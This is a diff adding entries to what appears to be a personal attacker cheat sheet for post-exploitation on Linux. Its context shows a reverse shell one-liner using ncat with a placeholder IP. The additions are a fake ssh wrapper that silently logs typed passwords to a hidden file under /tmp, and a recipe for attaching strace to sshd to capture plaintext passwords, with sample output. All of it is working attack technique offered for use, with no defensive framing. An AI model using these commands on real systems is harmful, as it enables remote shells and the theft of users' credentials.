@@ -63,3 +63,20 @@ Hostname *
 ncat -e /bin/bash <MYIP> 4141 &
 ```
 
+# Rude password grabber
+```
+# cat /usr/local/bin/ssh
+
+#!/bin/bash
+read -esp "${1}'s password: " password
+echo "$1 - $password" >> /tmp/.creds
+echo
+ /usr/bin/ssh $@
+ 
+```
+
+# Pull passwords out of ssh
+ps --ppid 1 | grep sshd
+strace -f -p 641 -e read |& grep -F "\f\0\0\0"
+
+[pid 2235] read(6, "\f\0\0\0\10secret", 10) = 10
